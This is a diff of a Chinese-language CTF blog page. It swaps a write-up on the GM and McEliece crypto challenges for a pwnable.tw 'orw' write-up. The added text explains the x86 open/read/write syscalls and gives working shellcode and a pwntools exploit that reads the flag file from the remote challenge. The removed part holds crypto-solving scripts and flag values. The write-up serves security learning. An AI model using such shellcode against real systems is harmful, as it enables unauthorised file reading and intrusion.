@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="GM根据pow(q ** 2 * x, (p-1)&#x2F;2, p) + pow(p ** 2 * x, (q-1)&#x2F;2, q) &#x3D;&#x3D; N - phi - 1可以得出pow(x, (p-1)&#x2F;2, p) &#x3D;&#x3D; -1。同时(pow(x, int(br + bi, 2), N) * r ** 2) % N等价于$x^{br\ast2+bi}\ast r^2\mod N$, 将其记为$a$，然后我们尝试计算一">
+<meta name="description" content="程序开了沙箱，只能使用open，read，write函数。因此整个流程就是先打开文件，然后读取内容，最后把内容打印出来。 这里需要了解每一个系统调用的参数设置。 openeax &#x3D; 0x05 系统调用号 ebx &#x3D; filename 文件名 ecx &#x3D; flags 置零即可 edx &#x3D; mode 置零即可 返回值eax &#x3D; fd readeax &#x3D; 0x03  系统调用号 ebx &#x3D; fd 文件指">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2020数字中国虎符CTF之GM&amp;McEliece">
-<meta property="og:url" content="https://zrax-x.github.io/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&McEliece/index.html">
+<meta property="og:title" content="pwnable.tw orw">
+<meta property="og:url" content="https://zrax-x.github.io/2020/10/11/pwnable_orw/index.html">
 <meta property="og:site_name" content="从零开始的博客">
-<meta property="og:description" content="GM根据pow(q ** 2 * x, (p-1)&#x2F;2, p) + pow(p ** 2 * x, (q-1)&#x2F;2, q) &#x3D;&#x3D; N - phi - 1可以得出pow(x, (p-1)&#x2F;2, p) &#x3D;&#x3D; -1。同时(pow(x, int(br + bi, 2), N) * r ** 2) % N等价于$x^{br\ast2+bi}\ast r^2\mod N$, 将其记为$a$，然后我们尝试计算一">
-<meta property="article:published_time" content="2020-04-20T07:00:00.000Z">
-<meta property="article:modified_time" content="2020-04-20T01:34:57.953Z">
+<meta property="og:description" content="程序开了沙箱，只能使用open，read，write函数。因此整个流程就是先打开文件，然后读取内容，最后把内容打印出来。 这里需要了解每一个系统调用的参数设置。 openeax &#x3D; 0x05 系统调用号 ebx &#x3D; filename 文件名 ecx &#x3D; flags 置零即可 edx &#x3D; mode 置零即可 返回值eax &#x3D; fd readeax &#x3D; 0x03  系统调用号 ebx &#x3D; fd 文件指">
+<meta property="article:published_time" content="2020-10-11T07:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-11T12:46:50.463Z">
 <meta property="article:author" content="zraxx">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="密码学">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="shellcode">
 <meta name="twitter:card" content="summary">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
@@ -60,7 +60,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>2020数字中国虎符CTF之GM&amp;McEliece | 从零开始的博客</title>
+<title>pwnable.tw orw | 从零开始的博客</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -245,11 +245,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-2020数字中国虎符CTF之GM&amp;McEliece" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-pwnable_orw" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&McEliece/" class="article-date">
-      <time datetime="2020-04-20T07:00:00.000Z" itemprop="datePublished">2020-04-20</time>
+      <a href="/2020/10/11/pwnable_orw/" class="article-date">
+      <time datetime="2020-10-11T07:00:00.000Z" itemprop="datePublished">2020-10-11</time>
 </a>
 
 
@@ -264,7 +264,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      2020数字中国虎符CTF之GM&amp;McEliece
+      pwnable.tw orw
     </h1>
   
 
@@ -275,7 +275,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -285,14 +285,25 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="GM"><a href="#GM" class="headerlink" title="GM"></a>GM</h3><p>根据<code>pow(q ** 2 * x, (p-1)/2, p) + pow(p ** 2 * x, (q-1)/2, q) == N - phi - 1</code>可以得出<code>pow(x, (p-1)/2, p) == -1</code>。同时<code>(pow(x, int(br + bi, 2), N) * r ** 2) % N</code>等价于$x^{br\ast2+bi}\ast r^2\mod N$, 将其记为$a$，然后我们尝试计算一下$a^{(p-1)/2}\mod p$。我们把$a$代入化简，得到$x^{br\ast2\ast(p-1)/2}\ast x^{bi\ast(p-1)/2}\ast r^{2\ast(p-1)/2}\mod p$，由于第一项和第三项的结果一定为1，因此，当$bi=1$时，整个式子的结果为-1，$bi=0$时整个式子的结果为1。据此，我们可以判断某一位是0还是1。</p>
-<p>代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: zraxx</span></span><br><span class="line"><span class="comment">#date: 2020-4-19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"output"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f = f.readlines()</span><br><span class="line">	</span><br><span class="line">phin = int(f[<span class="number">0</span>].strip())</span><br><span class="line">n = int(f[<span class="number">1</span>].strip())</span><br><span class="line">enc = eval(f[<span class="number">2</span>].strip())</span><br><span class="line"></span><br><span class="line">a = n-phin+<span class="number">1</span></span><br><span class="line"><span class="comment"># print iroot(a**2-4*n, 2)</span></span><br><span class="line">p = (a+iroot(a**<span class="number">2</span><span class="number">-4</span>*n, <span class="number">2</span>)[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> n%p==<span class="number">0</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc:</span><br><span class="line">	<span class="keyword">if</span> pow(x, (p<span class="number">-1</span>)//<span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">		res = res + <span class="string">'0'</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		res = res + <span class="string">'1'</span></span><br><span class="line">		</span><br><span class="line">print(long_to_bytes(int(res,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure>
-<p><strong>FLAG: flag{bd4f1790-f4a2-4904-b4d2-8db8b24fd864}</strong></p>
-<h3 id="McEliece"><a href="#McEliece" class="headerlink" title="McEliece"></a>McEliece</h3><p>根据pubkey可以得出，加密时plain长为28bit，结果为64bit，错误码中6位为1。由于flag中的字符类型有限，可以直接爆破，计算的结果$uG’$和题目给出的加密的结果$uG’+e$应该满足海明距离小于等于6。</p>
-<p>代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: zraxx</span></span><br><span class="line"><span class="comment">#date: 2020-4-19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">pubkey=load(<span class="string">"./pubkey.sobj"</span>)</span><br><span class="line">cipher=load(<span class="string">"./cipher.sobj"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> plain*pubkey</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same</span><span class="params">(a, b)</span>:</span></span><br><span class="line">	sum = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(a.ncols()):</span><br><span class="line">		<span class="keyword">if</span> a[<span class="number">0</span>,i] == b[<span class="number">0</span>,i]:</span><br><span class="line">			sum += <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> sum</span><br><span class="line">	</span><br><span class="line">l = <span class="number">28</span></span><br><span class="line">t = <span class="string">"0123456789abcdef-&#125;"</span></span><br><span class="line">len = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">"flag&#123;c9"</span></span><br><span class="line">prev_cand=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len&lt;<span class="number">12</span>:</span><br><span class="line">	<span class="keyword">print</span> len</span><br><span class="line">	cand = <span class="string">""</span></span><br><span class="line">	iter = product(t, repeat=<span class="number">4</span>)</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> iter:</span><br><span class="line">		tmp = flag+<span class="string">""</span>.join(x)</span><br><span class="line">		bin = BinaryStrings()</span><br><span class="line">		msg = map(int ,str(bin.encoding(tmp)))</span><br><span class="line">		plain = matrix(GF(<span class="number">2</span>),<span class="number">1</span>,l)</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(l):</span><br><span class="line">			plain[<span class="number">0</span>,j] = msg[l*len+j]</span><br><span class="line">		<span class="keyword">if</span> same(cipher[len], encrypt(plain))&gt;=(<span class="number">64</span><span class="number">-6</span>):</span><br><span class="line">			<span class="keyword">if</span> len%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">				prev_cand.append(x[<span class="number">3</span>])</span><br><span class="line">				cand = x</span><br><span class="line">				<span class="keyword">print</span> <span class="string">""</span>.join(x)</span><br><span class="line">				</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">if</span> x[<span class="number">0</span>] <span class="keyword">in</span> prev_cand:</span><br><span class="line">					flag += <span class="string">""</span>.join(x)</span><br><span class="line">					prev_cand = []</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> len%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">		flag+=<span class="string">""</span>.join(cand[:<span class="number">3</span>])</span><br><span class="line">	<span class="keyword">print</span> flag</span><br><span class="line">	len += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;c941a3cc-85e3-4401-a0f1-764206e71bf3&#125;</span></span><br></pre></td></tr></table></figure>
-<p><strong>FLAG: flag{c941a3cc-85e3-4401-a0f1-764206e71bf3}</strong></p>
+        <p>程序开了沙箱，只能使用open，read，write函数。因此整个流程就是先打开文件，然后读取内容，最后把内容打印出来。</p>
+<p>这里需要了解每一个系统调用的参数设置。</p>
+<h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><p>eax = 0x05 系统调用号</p>
+<p>ebx = filename 文件名</p>
+<p>ecx = flags 置零即可</p>
+<p>edx = mode 置零即可</p>
+<p><strong>返回值</strong>eax = fd</p>
+<h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><p>eax = 0x03  系统调用号</p>
+<p>ebx = fd 文件指针</p>
+<p>ecx = buf 缓冲区，存访读取内容</p>
+<p>edx = len 读取的字节数</p>
+<h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>eax = 0x04  系统调用号</p>
+<p>ebx = fd  文件指针，标准输出对应1</p>
+<p>ecx = buf</p>
+<p>edx = len</p>
+<p>因此最终写出shellcode如下（需要注意的是文件名如何赋值）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx;</span><br><span class="line">push ecx;</span><br><span class="line">push 0x67616c66;</span><br><span class="line">push 0x2f77726f;</span><br><span class="line">push 0x2f656d6f;</span><br><span class="line">push 0x682f2f2f;</span><br><span class="line">mov ebx, esp;</span><br><span class="line">xor edx, edx;</span><br><span class="line">mov eax, 5;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">mov ebx, eax;</span><br><span class="line">mov ecx, esp;</span><br><span class="line">mov edx, 0x30;</span><br><span class="line">mov eax, 3;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">mov ebx, 1;</span><br><span class="line">mov edx, 0x30;</span><br><span class="line">mov eax, 4;</span><br><span class="line">int 0x80;</span><br></pre></td></tr></table></figure>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx, ecx;</span></span><br><span class="line"><span class="string">push ecx;</span></span><br><span class="line"><span class="string">push 0x67616c66;</span></span><br><span class="line"><span class="string">push 0x2f77726f;</span></span><br><span class="line"><span class="string">push 0x2f656d6f;</span></span><br><span class="line"><span class="string">push 0x682f2f2f;</span></span><br><span class="line"><span class="string">mov ebx, esp;</span></span><br><span class="line"><span class="string">xor edx, edx;</span></span><br><span class="line"><span class="string">mov eax, 5;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, eax;</span></span><br><span class="line"><span class="string">mov ecx, esp;</span></span><br><span class="line"><span class="string">mov edx, 0x30;</span></span><br><span class="line"><span class="string">mov eax, 3;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, 1;</span></span><br><span class="line"><span class="string">mov edx, 0x30;</span></span><br><span class="line"><span class="string">mov eax, 4;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./orw')</span></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -301,13 +312,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&McEliece/">2020数字中国虎符CTF之GM&amp;McEliece</a></p>
+        <p><span>本文标题:</span><a href="/2020/10/11/pwnable_orw/">pwnable.tw orw</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">zraxx</a></p>
-        <p><span>发布时间:</span>2020-04-20, 00:00:00</p>
-        <p><span>最后更新:</span>2020-04-19, 18:34:57</p>
+        <p><span>发布时间:</span>2020-10-11, 00:00:00</p>
+        <p><span>最后更新:</span>2020-10-11, 05:46:50</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&McEliece/" title="2020数字中国虎符CTF之GM&amp;McEliece">https://zrax-x.github.io/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&amp;McEliece/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://zrax-x.github.io/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&amp;McEliece/　　作者: zraxx" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/10/11/pwnable_orw/" title="pwnable.tw orw">https://zrax-x.github.io/2020/10/11/pwnable_orw/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://zrax-x.github.io/2020/10/11/pwnable_orw/　　作者: zraxx" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -319,16 +330,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
-                    强网杯-随便注
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/04/18/Linux-Hook%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/">
-                    Linux Hook技术介绍
+                <a href="/2020/10/11/pwnable_start/">
+                    pwnable.tw start
                 </a>
             </div>
         
@@ -340,7 +345,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#GM"><span class="toc-number">1.</span> <span class="toc-text">GM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#McEliece"><span class="toc-number">2.</span> <span class="toc-text">McEliece</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#open"><span class="toc-number">1.</span> <span class="toc-text">open</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#read"><span class="toc-number">2.</span> <span class="toc-text">read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#write"><span class="toc-number">3.</span> <span class="toc-text">write</span></a></li></ol>
         
     </div>
     <style>
@@ -376,7 +381,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"2020数字中国虎符CTF之GM&McEliece　| 从零开始的博客　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"pwnable.tw orw　| 从零开始的博客　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -398,15 +403,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" title="上一篇: 强网杯-随便注">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/04/18/Linux-Hook%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/" title="下一篇: Linux Hook技术介绍">
+            <a href="/2020/10/11/pwnable_start/" title="下一篇: pwnable.tw start">
                 <i class="fa fa-angle-right"></i>
             </a>
         
